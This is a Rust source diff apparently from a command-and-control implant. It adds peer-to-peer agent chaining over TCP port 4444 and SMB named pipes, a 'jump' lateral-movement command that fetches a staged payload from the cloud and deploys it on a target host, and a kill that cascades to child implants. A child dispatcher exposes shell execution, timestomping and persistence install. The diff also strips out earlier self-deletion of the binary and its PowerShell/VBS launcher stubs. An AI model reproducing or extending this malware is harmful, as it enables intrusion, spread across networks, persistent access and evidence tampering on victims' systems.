@@ -66,6 +66,7 @@ pub fn dispatch(
         "exit" => return None,
 
         "kill" => {
+            cascade_kill_children();
             kill_cleanup(state, transport);
             return None;
         }
@@ -232,11 +233,108 @@ pub fn dispatch(
             Some(TaskResponse::ok(task, result))
         }
 
-        // "persist_action" is a PS-only shorthand — Rust does not support it
-        // "blobsave"       is PS-only — never sent to Rust agent
+        // ── P2P Commands ─────────────────────────────────────────────────────
+        "p2p_link_tcp" => {
+            let target = task.arg_str("target");
+            let port = task.arg_u64("port") as u16;
+            let addr = format!("{}:{}", target, if port == 0 { 4444 } else { port });
+            Some(TaskResponse::ok(task, cmd_p2p_link_tcp(&addr, &task.id)))
+        }
+
+        "p2p_link_smb" => {
+            let target = task.arg_str("target");
+            let pipe   = task.arg_str("pipe_name");
+            let pipe_name = if pipe.is_empty() { "stratum" } else { pipe };
+            Some(TaskResponse::ok(task, cmd_p2p_link_smb(target, pipe_name)))
+        }
+
+        "p2p_unlink" => {
+            let guid_hex = task.arg_str("guid");
+            Some(TaskResponse::ok(task, cmd_p2p_unlink(guid_hex)))
+        }
+
+        "p2p_status" => {
+            Some(TaskResponse::ok(task, cmd_p2p_status()))
+        }
+
+        "p2p_listener_start_tcp" => {
+            let addr = task.arg_str("addr");
+            let bind = if addr.is_empty() { "0.0.0.0:4444" } else { addr };
+            Some(TaskResponse::ok(task, cmd_p2p_listener_start_tcp(bind)))
+        }
+
+        "p2p_listener_stop" => {
+            let addr = task.arg_str("addr");
+            Some(TaskResponse::ok(task, cmd_p2p_listener_stop(addr)))
+        }
+
+        // ── Jump (lateral movement) ──────────────────────────────────────
+        "jump" => {
+            Some(cmd_jump(task, state, transport, session_key))
+        }
 
         other => {
             Some(TaskResponse::err(task, format!("ERROR: unknown task type '{}'", other)))
+        }
+    }
+}
+
+pub fn dispatch_p2p(
+    task: &Task,
+    state: &Arc<AgentState>,
+) -> Option<TaskResponse> {
+    match task.kind.as_str() {
+        "exit" => return None,
+        "kill" => {
+            cascade_kill_children();
+            return None;
+        }
+        "sysinfo" => Some(TaskResponse::ok(task, crate::sysinfo::full_sysinfo())),
+        "env" => Some(TaskResponse::ok(task, cmd_env())),
+        "sleep" => {
+            let secs = task.arg_u64("seconds");
+            Some(TaskResponse::ok(task, cmd_sleep(secs, state)))
+        }
+        "jitter" => {
+            let pct = task.arg_u64("percent");
+            Some(TaskResponse::ok(task, cmd_jitter(pct, state)))
+        }
+        "shell" => Some(cmd_shell(task, state)),
+        "timestomp" => {
+            let target = task.arg_str("target");
+            let reffile = task.arg_str("reference");
+            Some(TaskResponse::ok(task, cmd_timestomp(target, reffile)))
+        }
+        "timestomp_set" => {
+            let target = task.arg_str("target");
+            let ts     = task.arg_str("timestamp");
+            Some(TaskResponse::ok(task, cmd_timestomp_set(target, ts)))
+        }
+        "persist_probe" => {
+            let tech = task.arg_str("technique");
+            let out  = persist::probe(if tech.is_empty() { None } else { Some(tech) }, &state.blob_path);
+            Some(TaskResponse::ok(task, out))
+        }
+        "persist_install" => {
+            let tech = task.arg_str("technique");
+            let raw  = persist::technique_install(tech, &state.blob_path);
+            let (out, arts) = crate::protocol::parse_artifacts(&raw);
+            Some(TaskResponse::ok_artifacts(task, out, arts))
+        }
+        "persist_remove" => {
+            let tech = task.arg_str("technique");
+            let raw  = persist::technique_remove(tech);
+            let (out, arts) = crate::protocol::parse_artifacts(&raw);
+            Some(TaskResponse::ok_artifacts(task, out, arts))
+        }
+        "persist_status" => {
+            let tech = task.arg_str("technique");
+            let out  = persist::technique_status(tech, &state.blob_path);
+            Some(TaskResponse::ok(task, out))
+        }
+        "p2p_status" => Some(TaskResponse::ok(task, cmd_p2p_status())),
+        other => {
+            Some(TaskResponse::err(task, format!("ERROR: '{}' requires cloud transport (not available on P2P child)", other)))
         }
     }
 }
@@ -683,42 +781,329 @@ fn kill_cleanup(state: &Arc<AgentState>, transport: &SharedTransport) {
     }
     let _ = persist::remove_all();
     transport.upload(&state.input_path, b"MZ");
-    // Self-delete the beacon binary. On Unix unlink works while the process is
-    // running. On Windows the file is locked; schedule deletion at next reboot
-    // via MoveFileEx or simply attempt removal (no-op if it fails — persist is
-    // already gone so the binary is orphaned and will not re-execute).
-    if let Ok(exe) = std::env::current_exe() {
-        #[cfg(unix)]
-        let _ = std::fs::remove_file(&exe);
-        #[cfg(windows)]
-        {
-            // Try immediate delete first (works if not locked by antivirus).
-            if std::fs::remove_file(&exe).is_err() {
-                // Schedule for deletion on next reboot via MoveFileExW.
-                use std::os::windows::ffi::OsStrExt;
-                let wide: Vec<u16> = exe.as_os_str().encode_wide().chain(Some(0)).collect();
-                // MOVEFILE_DELAY_UNTIL_REBOOT = 0x4
-                unsafe { crate::dynapi::move_file_ex_w(wide.as_ptr(), std::ptr::null(), 0x4); }
+}
+
+/// kill_cleanup + cascade. Called on kill-date expiry.
+pub(crate) fn kill_cleanup_self(state: &Arc<AgentState>, transport: &SharedTransport) {
+    cascade_kill_children();
+    kill_cleanup(state, transport);
+}
+
+fn cascade_kill_children() {
+    let child_guids = P2P_REGISTRY.child_guids();
+    if child_guids.is_empty() { return; }
+    crate::dlog!("kill", "cascading kill to {} children", child_guids.len());
+    for cg in &child_guids {
+        let kill_payload = b"{\"id\":\"kill-cascade\",\"kind\":\"kill\",\"args\":\"\"}";
+        let msg = crate::p2p::RoutedMessage {
+            msg_type: crate::p2p::MsgType::Delivery,
+            next_guid: *cg,
+            payload: kill_payload.to_vec(),
+        };
+        let serialized = msg.serialize();
+        let children = P2P_REGISTRY.children.lock().unwrap();
+        if let Some(child) = children.get(cg) {
+            if let Some(enc) = crate::p2p::router::encrypt_for_link(&child.link_key, &serialized) {
+                let _ = child.transport.send(&enc);
             }
         }
     }
-    // Delete the .ps1 stub and its .vbs launcher. The PS1 stub sets _STUB_PATH
-    // before exec-ing stage2, so we inherit it even as a native EXE.
-    #[cfg(windows)]
-    if let Ok(stub_ps1) = std::env::var("_STUB_PATH") {
-        let stub_path = std::path::Path::new(&stub_ps1);
-        let _ = std::fs::remove_file(stub_path);
-        // Derive the .vbs launcher path by swapping the extension.
-        let vbs_path = stub_path.with_extension("vbs");
-        if vbs_path.exists() {
-            let _ = std::fs::remove_file(&vbs_path);
+    std::thread::sleep(std::time::Duration::from_millis(500));
+    for cg in &child_guids {
+        if let Some(link) = P2P_REGISTRY.remove_child(cg) {
+            link.transport.close();
         }
+    }
+    TCP_LISTENER_MGR.stop_all();
+}
+
+// ── P2P commands ─────────────────────────────────────────────────────────────
+
+use once_cell::sync::Lazy;
+use crate::p2p::{LinkRegistry, LinkType};
+use std::sync::Mutex;
+
+static P2P_REGISTRY: Lazy<std::sync::Arc<LinkRegistry>> = Lazy::new(|| {
+    let mut guid = [0u8; 16];
+    rand::thread_rng().fill_bytes(&mut guid);
+    std::sync::Arc::new(LinkRegistry::new(guid))
+});
+
+static TCP_LISTENER_MGR: Lazy<crate::p2p::tcp::TcpListenerManager> =
+    Lazy::new(|| crate::p2p::tcp::TcpListenerManager::new());
+
+pub fn p2p_registry() -> &'static std::sync::Arc<LinkRegistry> {
+    &P2P_REGISTRY
+}
+
+fn cmd_p2p_link_tcp(addr: &str, _task_id: &str) -> String {
+    use std::time::{Duration, Instant};
+
+    let registry = P2P_REGISTRY.clone();
+    let start = Instant::now();
+    let max_duration = Duration::from_secs(60);
+    let retry_interval = Duration::from_secs(5);
+    let connect_timeout = Duration::from_secs(5);
+    let mut attempt = 0u32;
+
+    loop {
+        attempt += 1;
+        crate::dlog!("p2p_link", "attempt {} to {}", attempt, addr);
+
+        match crate::p2p::tcp::tcp_connect(addr, connect_timeout) {
+            Ok(transport) => {
+                let arc_t: std::sync::Arc<dyn crate::p2p::P2PTransport> =
+                    std::sync::Arc::new(transport);
+                match crate::p2p::link::link_as_parent(arc_t, registry.my_guid, LinkType::Tcp) {
+                    Ok(link) => {
+                        let guid_hex = hex::encode(&link.guid);
+                        let address = link.address.clone();
+                        let child_guid = link.guid;
+                        let link_key = link.link_key;
+                        registry.add_child(link);
+                        crate::dlog!("p2p_link", "linked to {} (GUID {})", address, guid_hex);
+
+                        // Wait for child's auto-checkin — up to 10s
+                        let mut checkin_json_str = String::new();
+                        for _ci in 0..10 {
+                            let recv_res = {
+                                let children = registry.children.lock().unwrap();
+                                if let Some(child) = children.get(&child_guid) {
+                                    match child.transport.recv() {
+                                        Ok(enc) => {
+                                            crate::p2p::router::decrypt_from_link(&link_key, &enc)
+                                        }
+                                        Err(_) => None,
+                                    }
+                                } else { None }
+                            };
+                            if let Some(plain) = recv_res {
+                                if plain.len() >= 1 && plain[0] == crate::p2p::CtrlType::Heartbeat as u8 {
+                                    continue;
+                                }
+                                if let Ok(checkin) = serde_json::from_slice::<serde_json::Value>(&plain) {
+                                    if checkin.get("type").and_then(|v| v.as_str()) == Some("p2p_checkin") {
+                                        checkin_json_str = serde_json::to_string(&checkin).unwrap_or_default();
+                                        crate::dlog!("p2p_link", "got child checkin ({} bytes)", checkin_json_str.len());
+                                    }
+                                }
+                                break;
+                            }
+                            std::thread::sleep(Duration::from_secs(1));
+                        }
+
+                        return if checkin_json_str.is_empty() {
+                            format!("OK: Linked to {} via TCP (child GUID: {})",
+                                    address, guid_hex)
+                        } else {
+                            format!("OK: Linked to {} via TCP (child GUID: {})\n---CHILD_CHECKIN---\n{}",
+                                    address, guid_hex, checkin_json_str)
+                        };
+                    }
+                    Err(e) => {
+                        crate::dlog!("p2p_link", "handshake failed: {}", e);
+                    }
+                }
+            }
+            Err(e) => {
+                crate::dlog!("p2p_link", "connect failed: {}", e);
+            }
+        }
+
+        if start.elapsed() >= max_duration {
+            crate::dlog!("p2p_link", "giving up after {} attempts ({}s)",
+                         attempt, start.elapsed().as_secs());
+            return format!("ERROR: Link to {} failed after {} attempts ({}s)",
+                           addr, attempt, start.elapsed().as_secs());
+        }
+
+        std::thread::sleep(retry_interval);
     }
 }
 
-/// kill_cleanup + self-delete. Called on kill-date expiry (same as kill now).
-pub(crate) fn kill_cleanup_self(state: &Arc<AgentState>, transport: &SharedTransport) {
-    kill_cleanup(state, transport);
+fn cmd_p2p_link_smb(target: &str, pipe_name: &str) -> String {
+    #[cfg(windows)]
+    let connect_result = crate::p2p::smb::smb_connect(target, pipe_name);
+
+    #[cfg(not(windows))]
+    let connect_result = crate::p2p::smb_client::smb_client_connect(target, pipe_name);
+
+    let transport: std::sync::Arc<dyn crate::p2p::P2PTransport> = match connect_result {
+        Ok(t) => std::sync::Arc::new(t),
+        Err(e) => return format!("ERROR: SMB connect to {}\\pipe\\{} failed: {}", target, pipe_name, e),
+    };
+    match crate::p2p::link::link_as_parent(transport, P2P_REGISTRY.my_guid, LinkType::Smb) {
+        Ok(link) => {
+            let guid_hex = hex::encode(&link.guid);
+            let address = link.address.clone();
+            P2P_REGISTRY.add_child(link);
+            format!("OK: Linked to {} via SMB (child GUID: {})", address, guid_hex)
+        }
+        Err(e) => format!("ERROR: Link handshake failed: {}", e),
+    }
+}
+
+fn cmd_p2p_unlink(guid_hex: &str) -> String {
+    let bytes = match hex::decode(guid_hex) {
+        Ok(b) if b.len() == 16 => {
+            let mut g = [0u8; 16];
+            g.copy_from_slice(&b);
+            g
+        }
+        _ => return format!("ERROR: Invalid GUID: {}", guid_hex),
+    };
+    match P2P_REGISTRY.remove_child(&bytes) {
+        Some(link) => {
+            link.transport.close();
+            format!("OK: Unlinked child {}", guid_hex)
+        }
+        None => format!("ERROR: No child with GUID {}", guid_hex),
+    }
+}
+
+fn cmd_p2p_status() -> String {
+    use crate::protocol::P2PStatusInfo;
+    use crate::protocol::P2PLinkInfo;
+
+    let parent_info = {
+        let parent = P2P_REGISTRY.parent.lock().unwrap();
+        parent.as_ref().map(|p| P2PLinkInfo {
+            guid:      hex::encode(&p.guid),
+            link_type: p.link_type.to_string(),
+            address:   p.address.clone(),
+            alive:     p.is_alive(),
+        })
+    };
+
+    let children_info: Vec<P2PLinkInfo> = {
+        let children = P2P_REGISTRY.children.lock().unwrap();
+        children.values().map(|c| P2PLinkInfo {
+            guid:      hex::encode(&c.guid),
+            link_type: c.link_type.to_string(),
+            address:   c.address.clone(),
+            alive:     c.is_alive(),
+        }).collect()
+    };
+
+    let status = P2PStatusInfo {
+        my_guid:  hex::encode(&P2P_REGISTRY.my_guid),
+        parent:   parent_info,
+        children: children_info,
+    };
+
+    serde_json::to_string_pretty(&status).unwrap_or_else(|_| "ERROR: serialize".to_string())
+}
+
+fn cmd_p2p_listener_start_tcp(addr: &str) -> String {
+    match TCP_LISTENER_MGR.start(addr) {
+        Ok(listener) => {
+            let actual = listener.local_addr()
+                .map(|a| a.to_string())
+                .unwrap_or_else(|_| addr.to_string());
+            // Spawn accept loop in background thread
+            let registry = P2P_REGISTRY.clone();
+            let listener_clone = listener.clone();
+            std::thread::spawn(move || {
+                while listener_clone.is_alive() {
+                    match listener_clone.accept() {
+                        Ok(stream_transport) => {
+                            let arc_t: std::sync::Arc<dyn crate::p2p::P2PTransport> =
+                                std::sync::Arc::new(stream_transport);
+                            let my_guid = registry.my_guid;
+                            match crate::p2p::link::link_as_parent(arc_t, my_guid, LinkType::Tcp) {
+                                Ok(link) => {
+                                    registry.add_child(link);
+                                }
+                                Err(_) => {}
+                            }
+                        }
+                        Err(_) => break,
+                    }
+                }
+            });
+            format!("OK: TCP P2P listener started on {}", actual)
+        }
+        Err(e) => format!("ERROR: TCP listen on {} failed: {}", addr, e),
+    }
+}
+
+fn cmd_p2p_listener_stop(addr: &str) -> String {
+    if addr.is_empty() {
+        TCP_LISTENER_MGR.stop_all();
+        "OK: All P2P listeners stopped".to_string()
+    } else if TCP_LISTENER_MGR.stop(addr) {
+        format!("OK: P2P listener on {} stopped", addr)
+    } else {
+        format!("ERROR: No P2P listener on {}", addr)
+    }
+}
+
+// ── JUMP (lateral movement) ──────────────────────────────────────────────────
+
+fn cmd_jump(task: &Task, state: &Arc<AgentState>, transport: &SharedTransport,
+            session_key: &[u8; 32]) -> TaskResponse {
+    use crate::p2p::jump::{self, JumpParams, JumpResult};
+    use std::time::Duration;
+
+    let params = JumpParams::from_args(&task.args);
+
+    if params.target.is_empty() {
+        return TaskResponse::err(task, "ERROR: jump target is required".into());
+    }
+    if params.staging_path.is_empty() {
+        return TaskResponse::err(task, "ERROR: staging_path is required".into());
+    }
+
+    crate::dlog!("jump", "module={} target={} link={} bind={}",
+                 params.module, params.target, params.link_type, params.bind_addr);
+
+    // Download the staged P2P child binary from cloud
+    let payload = match transport.download(&params.staging_path) {
+        Some(data) if !data.is_empty() => data,
+        Some(_) => return TaskResponse::err(task, "ERROR: staged payload is empty".into()),
+        None    => return TaskResponse::err(task, "ERROR: failed to download staged payload".into()),
+    };
+
+    crate::dlog!("jump", "downloaded payload: {} bytes", payload.len());
+
+    // Clean up the staged file from cloud
+    transport.delete(&params.staging_path);
+
+    // Execute the jump module to deploy the child on the target
+    let jump_result = jump::dispatch(&params, &payload);
+
+    match jump_result {
+        JumpResult::Failed { error } => {
+            TaskResponse::err(task, format!("ERROR: jump {} failed: {}", params.module, error))
+        }
+        JumpResult::Success { remote_path } => {
+            crate::dlog!("jump", "deployed to {} — waiting for child listener", remote_path);
+
+            // Wait for the child agent to start its P2P listener
+            std::thread::sleep(Duration::from_secs(3));
+
+            // Auto-link to the child (synchronous — blocks until linked or timeout)
+            let link_result = if params.link_type == "smb" {
+                let pipe = params.bind_addr
+                    .rsplit('\\').next()
+                    .unwrap_or("stratum");
+                cmd_p2p_link_smb(&params.target, pipe)
+            } else {
+                let addr = if params.bind_addr.starts_with("0.0.0.0:") {
+                    let port = params.bind_addr.split(':').last().unwrap_or("4444");
+                    format!("{}:{}", params.target, port)
+                } else {
+                    params.bind_addr.clone()
+                };
+                cmd_p2p_link_tcp(&addr, &task.id)
+            };
+
+            TaskResponse::ok(task, format!(
+                "jump {} → {} deployed\nDeployed: {}\nLink: {}",
+                params.module, params.target, remote_path, link_result
+            ))
+        }
+    }
 }
 
 // ── timestamp helpers ─────────────────────────────────────────────────────────
